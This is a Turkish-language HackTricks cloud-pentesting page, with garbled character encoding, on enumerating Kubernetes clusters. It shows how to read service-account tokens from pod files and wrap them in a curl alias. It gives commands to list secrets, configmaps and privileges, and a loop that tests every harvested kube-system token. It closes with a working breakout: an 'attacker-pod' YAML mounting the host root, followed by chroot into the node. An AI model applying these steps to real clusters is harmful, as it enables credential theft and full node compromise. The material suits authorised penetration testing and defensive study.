# Kubernetes Enumeration

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Kubernetes Tokenleri

Bir makineye eriÅŸiminiz varsa, kullanÄ±cÄ± bazÄ± Kubernetes platformlarÄ±na eriÅŸime sahip olabilir. Token genellikle **env var `KUBECONFIG`** tarafÄ±ndan iÅŸaret edilen bir dosyada veya **`~/.kube`** iÃ§inde bulunur.

Bu klasÃ¶rde **API sunucusuna baÄŸlanmak iÃ§in tokenler ve yapÄ±landÄ±rmalar iÃ§eren yapÄ±landÄ±rma dosyalarÄ±** bulabilirsiniz. Bu klasÃ¶rde ayrÄ±ca daha Ã¶nce alÄ±nan bilgileri iÃ§eren bir Ã¶nbellek klasÃ¶rÃ¼ de bulabilirsiniz.

EÄŸer bir Kubernetes ortamÄ±nda bir pod'u ele geÃ§irdiyseniz, tokenler ve mevcut K8 ortamÄ± hakkÄ±nda bilgi bulabileceÄŸiniz baÅŸka yerler de vardÄ±r:

### Servis HesabÄ± Tokenleri

Devam etmeden Ã¶nce, Kubernetes'te bir servisin ne olduÄŸunu bilmiyorsanÄ±z, **bu baÄŸlantÄ±yÄ± takip etmenizi ve en azÄ±ndan Kubernetes mimarisi hakkÄ±nda bilgi okumanÄ±zÄ± Ã¶neririm.**

Kubernetes [belgelerinden](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) alÄ±nmÄ±ÅŸtÄ±r:

_â€œBir pod oluÅŸturduÄŸunuzda, bir servis hesabÄ± belirtmezseniz, otomatik olarak aynÄ± ad alanÄ±ndaki_ default _servis hesabÄ±na atanÄ±r.â€_

**ServiceAccount**, Kubernetes tarafÄ±ndan yÃ¶netilen ve bir pod iÃ§inde Ã§alÄ±ÅŸan sÃ¼reÃ§ler iÃ§in bir kimlik saÄŸlamak amacÄ±yla kullanÄ±lan bir nesnedir.\
Her servis hesabÄ±nÄ±n ona baÄŸlÄ± bir sÄ±rrÄ± vardÄ±r ve bu sÄ±r, bir taÅŸÄ±yÄ±cÄ± token iÃ§erir. Bu, iki taraf arasÄ±nda talepleri gÃ¼venli bir ÅŸekilde temsil etmenin bir yolu olan JSON Web Token (JWT) dir.

Genellikle **bir** dizin:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

aÅŸaÄŸÄ±daki dosyalarÄ± iÃ§erir:

* **ca.crt**: Kubernetes iletiÅŸimlerini kontrol etmek iÃ§in ca sertifikasÄ±dÄ±r.
* **namespace**: Mevcut ad alanÄ±nÄ± belirtir.
* **token**: Mevcut pod'un **servis tokenini** iÃ§erir.

ArtÄ±k token'e sahip olduÄŸunuzda, API sunucusunu **`KUBECONFIG`** ortam deÄŸiÅŸkeni iÃ§inde bulabilirsiniz. Daha fazla bilgi iÃ§in `(env | set) | grep -i "kuber|kube`**`"`** komutunu Ã§alÄ±ÅŸtÄ±rÄ±n.

Servis hesabÄ± tokeni, **sa.key** dosyasÄ±nda bulunan anahtar ile imzalanÄ±r ve **sa.pub** tarafÄ±ndan doÄŸrulanÄ±r.

**Kubernetes** Ã¼zerindeki varsayÄ±lan konum:

* /etc/kubernetes/pki

**Minikube** Ã¼zerindeki varsayÄ±lan konum:

* /var/lib/localkube/certs

### SÄ±cak Podlar

_**SÄ±cak podlar,**_ ayrÄ±calÄ±klÄ± bir servis hesabÄ± tokeni iÃ§eren podlardÄ±r. AyrÄ±calÄ±klÄ± bir servis hesabÄ± tokeni, gizli bilgileri listeleme, pod oluÅŸturma gibi ayrÄ±calÄ±klÄ± gÃ¶revleri yapma iznine sahip bir token'dÄ±r.

## RBAC

EÄŸer **RBAC**'Ä±n ne olduÄŸunu bilmiyorsanÄ±z, **bu bÃ¶lÃ¼mÃ¼ okuyun**.

## Enumeration CheatSheet

Bir K8s ortamÄ±nÄ± listelemek iÃ§in ÅŸunlara ihtiyacÄ±nÄ±z var:

* **geÃ§erli bir kimlik doÄŸrulama tokeni**. Ã–nceki bÃ¶lÃ¼mde bir kullanÄ±cÄ± tokeni ve bir servis hesabÄ± tokeni iÃ§in nerede arama yapacaÄŸÄ±mÄ±zÄ± gÃ¶rdÃ¼k.
* **Kubernetes API'sinin adresi** (_**https://host:port**_). Bu genellikle ortam deÄŸiÅŸkenlerinde ve/veya kube yapÄ±landÄ±rma dosyasÄ±nda bulunabilir.
* **Opsiyonel**: **API sunucusunu doÄŸrulamak iÃ§in ca.crt**. Bu, tokenin bulunduÄŸu yerlerde bulunabilir. API sunucusu sertifikasÄ±nÄ± doÄŸrulamak iÃ§in yararlÄ±dÄ±r, ancak `kubectl` ile `--insecure-skip-tls-verify` veya `curl` ile `-k` kullanarak buna ihtiyacÄ±nÄ±z olmayacaktÄ±r.

Bu detaylarla **kubernetes'i listeleyebilirsiniz**. EÄŸer **API** bir nedenle **Ä°nternet** Ã¼zerinden **eriÅŸilebilir** ise, bu bilgiyi indirip platformu kendi makinenizden listeleyebilirsiniz.

Ancak genellikle **API sunucusu dahili bir aÄŸdadÄ±r**, bu nedenle ona eriÅŸmek iÃ§in ele geÃ§irilmiÅŸ makine Ã¼zerinden **bir tÃ¼nel oluÅŸturmanÄ±z** gerekecektir veya **`kubectl`** ikili dosyasÄ±nÄ± **yÃ¼kleyebilir** veya **`curl/wget/anything`** kullanarak API sunucusuna ham HTTP istekleri gÃ¶nderebilirsiniz.

### `list` ve `get` fiilleri arasÄ±ndaki farklar

**`get`** izinleri ile belirli varlÄ±klarÄ±n bilgilerine eriÅŸebilirsiniz (_`kubectl`'deki `describe` seÃ§eneÄŸi_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
EÄŸer **`list`** iznine sahipseniz, bir varlÄ±k tÃ¼rÃ¼nÃ¼ listelemek iÃ§in API istekleri gerÃ§ekleÅŸtirme izniniz vardÄ±r (_`kubectl`'deki `get` seÃ§eneÄŸi_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
EÄŸer **`watch`** iznine sahipseniz, varlÄ±klarÄ± izlemek iÃ§in API istekleri gerÃ§ekleÅŸtirme izniniz vardÄ±r:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Bir deÄŸiÅŸiklik olduÄŸunda (veya yeni bir tane oluÅŸturulduÄŸunda) size bir Deployment'Ä±n tam manifestosunu dÃ¶ndÃ¼ren bir akÄ±ÅŸ baÄŸlantÄ±sÄ± aÃ§arlar.

{% hint style="danger" %}
AÅŸaÄŸÄ±daki `kubectl` komutlarÄ± nesneleri listelemenin nasÄ±l olduÄŸunu gÃ¶sterir. Verilere eriÅŸmek istiyorsanÄ±z `get` yerine `describe` kullanmalÄ±sÄ±nÄ±z.
{% endhint %}

### curl Kullanarak

Bir podun iÃ§inden birkaÃ§ ortam deÄŸiÅŸkeni kullanabilirsiniz:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
VarsayÄ±lan olarak pod, **`kubernetes.default.svc`** alan adÄ±ndaki **kube-api sunucusuna** **eriÅŸebilir** ve burada kubernetes DNS sunucusunun adresini bulacaÄŸÄ±nÄ±z **`/etc/resolv.config`** dosyasÄ±nda kube aÄŸÄ±nÄ± gÃ¶rebilirsiniz (aynÄ± aralÄ±ÄŸÄ±n ".1" kÄ±smÄ± kube-api uÃ§ noktasÄ±dÄ±r).
{% endhint %}

### kubectl KullanÄ±mÄ±

Token ve API sunucusunun adresine sahip olduÄŸunuzda, buradaki gibi eriÅŸmek iÃ§in kubectl veya curl kullanÄ±rsÄ±nÄ±z:

VarsayÄ±lan olarak, APISERVER `https://` ÅŸemasÄ± ile iletiÅŸim kurmaktadÄ±r.

{% code overflow="wrap" %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
{% endcode %}

> EÄŸer URL'de `https://` yoksa, Bad Request gibi bir hata alabilirsiniz.

Burada [**resmi kubectl kÄ±lavuzunu bulabilirsiniz**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). AÅŸaÄŸÄ±daki bÃ¶lÃ¼mlerin amacÄ±, eriÅŸim saÄŸladÄ±ÄŸÄ±nÄ±z yeni K8s'i sÄ±ralÄ± bir ÅŸekilde listelemek ve anlamaktÄ±r.

`kubectl`'nin gÃ¶nderdiÄŸi HTTP isteÄŸini bulmak iÃ§in `-v=8` parametresini kullanabilirsiniz.

#### MitM kubectl - kubectl'yi Proxy'leme
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Mevcut KonfigÃ¼rasyon

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

EÄŸer bazÄ± kullanÄ±cÄ±larÄ±n kimlik bilgilerini Ã§almayÄ± baÅŸardÄ±ysanÄ±z, bunlarÄ± **yerel olarak yapÄ±landÄ±rabilirsiniz** ÅŸÃ¶yle bir ÅŸey kullanarak:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Desteklenen KaynaklarÄ± Al

Bu bilgiyle listeleyebileceÄŸiniz tÃ¼m hizmetleri bileceksiniz

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Mevcut Yetkileri Al

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Yetki kontrolÃ¼ yapmanÄ±n bir diÄŸer yolu, ÅŸu aracÄ± kullanmaktÄ±r: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

**Kubernetes RBAC** hakkÄ±nda daha fazla bilgi edinebilirsiniz:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Hangi yetkilere sahip olduÄŸunuzu Ã¶ÄŸrendikten sonra**, yetkileri yÃ¼kseltmek iÃ§in **bunlarÄ± kÃ¶tÃ¼ye kullanÄ±p kullanamayacaÄŸÄ±nÄ±zÄ±** Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± kontrol edin:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### DiÄŸer rollerin alÄ±nmasÄ±

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Ad alanlarÄ±nÄ± al

Kubernetes, aynÄ± fiziksel kÃ¼me tarafÄ±ndan desteklenen **birden fazla sanal kÃ¼me**'yi destekler. Bu sanal kÃ¼melere **ad alanlarÄ±** denir.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Gizli bilgileri al

{% tabs %}
{% tab title="kubectl" %}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

EÄŸer gizli bilgileri okuyabiliyorsanÄ±z, her bir token ile ilgili ayrÄ±calÄ±klarÄ± almak iÃ§in aÅŸaÄŸÄ±daki satÄ±rlarÄ± kullanabilirsiniz:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Hizmet HesaplarÄ±nÄ± Al

Bu sayfanÄ±n baÅŸÄ±nda tartÄ±ÅŸÄ±ldÄ±ÄŸÄ± gibi **bir pod Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda genellikle ona bir hizmet hesabÄ± atanÄ±r**. Bu nedenle, hizmet hesaplarÄ±nÄ±, izinlerini ve nerede Ã§alÄ±ÅŸtÄ±klarÄ±nÄ± listelemek, bir kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ± artÄ±rmasÄ±na olanak tanÄ±yabilir.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### DaÄŸÄ±tÄ±mlarÄ± Al

DaÄŸÄ±tÄ±mlar, **Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±** gereken **bileÅŸenleri** belirtir.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### PodlarÄ± Al

Podlar, **Ã§alÄ±ÅŸacak** olan gerÃ§ek **konteynerlerdir**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Hizmetleri Al

Kubernetes **hizmetleri**, bir **hizmeti belirli bir port ve IP'de aÃ§mak iÃ§in** kullanÄ±lÄ±r (bu, aslÄ±nda hizmeti sunan pod'lara yÃ¼k dengeleyici olarak iÅŸlev gÃ¶recektir). Bu, saldÄ±rmayÄ± denemek iÃ§in diÄŸer hizmetleri nerede bulabileceÄŸinizi bilmek aÃ§Ä±sÄ±ndan ilginÃ§tir.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### DÃ¼ÄŸÃ¼mleri Al

**KÃ¼me iÃ§inde yapÄ±landÄ±rÄ±lmÄ±ÅŸ tÃ¼m dÃ¼ÄŸÃ¼mleri** al.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### DaemonSet'leri Al

**DaemonSet'ler**, **belirli bir pod'un kÃ¼menin tÃ¼m dÃ¼ÄŸÃ¼mlerinde** (veya seÃ§ilenlerde) Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan emin olmayÄ± saÄŸlar. DaemonSet'i silerseniz, onun tarafÄ±ndan yÃ¶netilen pod'lar da kaldÄ±rÄ±lacaktÄ±r.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Cronjob Al

Cron iÅŸleri, belirli bir eylemi gerÃ§ekleÅŸtirecek bir pod'un baÅŸlatÄ±lmasÄ±nÄ± crontab benzeri bir sÃ¶zdizimi kullanarak planlamaya olanak tanÄ±r.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### configMap Al

configMap her zaman kubernetes'te Ã§alÄ±ÅŸan uygulamalara saÄŸlanan birÃ§ok bilgi ve yapÄ±landÄ±rma dosyasÄ± iÃ§erir. Genellikle, diÄŸer iÃ§/dÄ±ÅŸ hizmetlere baÄŸlanmak ve doÄŸrulamak iÃ§in kullanÄ±lan birÃ§ok ÅŸifre, gizli anahtar ve token bulabilirsiniz.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}
{% endtabs %}

### AÄŸ PolitikalarÄ±nÄ± Al / Cilium AÄŸ PolitikalarÄ±

{% tabs %}
{% tab title="Ä°lk Sekme" %}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{% endtab %}
{% endtabs %}

### Her Åeyi Al / Hepsi

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all
```
{% endtab %}
{% endtabs %}

### **Pod tÃ¼ketimlerini al**

{% tabs %}
{% tab title="kubectl" %}
```bash
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Pod'dan kaÃ§Ä±ÅŸ

Yeni pod'lar oluÅŸturabiliyorsanÄ±z, bunlardan node'a kaÃ§Ä±ÅŸ yapabilirsiniz. Bunu yapmak iÃ§in bir yaml dosyasÄ± kullanarak yeni bir pod oluÅŸturmanÄ±z, oluÅŸturulan pod'a geÃ§iÅŸ yapmanÄ±z ve ardÄ±ndan node'un sistemine chroot yapmanÄ±z gerekir. Mevcut pod'larÄ± yaml dosyasÄ± iÃ§in referans olarak kullanabilirsiniz Ã§Ã¼nkÃ¼ mevcut gÃ¶rÃ¼ntÃ¼leri ve yollarÄ± gÃ¶sterirler.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> EÄŸer belirli bir dÃ¼ÄŸÃ¼mde pod oluÅŸturmanÄ±z gerekiyorsa, dÃ¼ÄŸÃ¼m Ã¼zerindeki etiketleri almak iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz.
>
> `k get nodes --show-labels`
>
> Genellikle, kubernetes.io/hostname ve node-role.kubernetes.io/master, seÃ§im iÃ§in iyi etiketlerdir.

Sonra attack.yaml dosyanÄ±zÄ± oluÅŸturursunuz.
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Bundan sonra pod'u oluÅŸturursunuz.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
ArtÄ±k oluÅŸturulan pod'a aÅŸaÄŸÄ±daki gibi geÃ§iÅŸ yapabilirsiniz
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Ve sonunda dÃ¼ÄŸÃ¼mÃ¼n sistemine chroot yaparsÄ±nÄ±z.
```bash
chroot /root /bin/bash
```
Bilgi alÄ±ndÄ±: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referanslar

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
